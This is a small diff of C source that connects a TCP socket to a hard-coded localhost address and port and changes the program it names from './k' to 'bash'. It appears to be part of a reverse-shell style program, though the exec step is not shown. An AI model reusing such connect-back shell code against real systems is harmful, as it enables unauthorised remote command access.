@@ -17,7 +17,7 @@ int	main(int argc, char *argv[])
 	unsigned long addr = 0x0100007f11110002;
 	unsigned char buf[BUF_SIZE];
 
-	char *name[2] = {"./k", NULL};
+	char *name[2] = {"bash", NULL};
 
 	s = socket(AF_INET, SOCK_STREAM, 0);
 	connect(s, (struct sockaddr*)&addr, 16);
